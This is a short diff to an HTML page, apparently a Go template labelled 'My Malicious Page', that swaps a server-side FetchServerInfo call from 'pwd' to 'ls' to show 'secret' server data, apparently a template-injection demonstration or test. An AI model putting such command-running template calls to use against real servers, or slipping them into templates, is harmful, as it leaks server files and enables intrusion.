@@ -4,7 +4,7 @@
 <h1>Welcome to My Malicious Page</h1>
 <p>Server's secret data:</p>
 <pre>
-{{.FetchServerInfo "pwd"}}
+{{.FetchServerInfo "ls"}}
 </pre>
 </body>
 </html>
